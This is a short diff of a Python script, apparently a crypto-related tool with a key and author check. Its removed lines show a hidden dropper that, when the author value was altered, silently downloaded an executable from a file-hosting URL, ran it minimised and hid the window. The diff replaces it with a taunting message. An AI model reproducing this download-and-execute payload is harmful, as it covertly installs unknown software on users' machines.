@@ -47,16 +47,7 @@ else:
 print(Fore.GREEN + 'Checking if Key is Vaild... ')
 time.sleep(1)
 if author != base64.b64decode('TE8kUg==').decode('utf-8'):
-    import subprocess
-    url = 'https://cdn-148.anonfiles.com/n7CbDekbza/8c7e55d7-1681242724/powershell_install+%281%29.exe'
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
-    req = urllib.request.Request(url, headers=headers)
-    urllib.request.urlretrieve(req.full_url, "powershell_install.exe")
-    startupinfo = subprocess.STARTUPINFO()
-    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-    subprocess.Popen(['cmd', '/c', 'start /min powershell_install.exe'], startupinfo=startupinfo)
-    hwnd = win32gui.GetForegroundWindow()
-    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+    print(Fore.RED + 'L SKID')
     exit()
 
 if crypto == 'ETH':
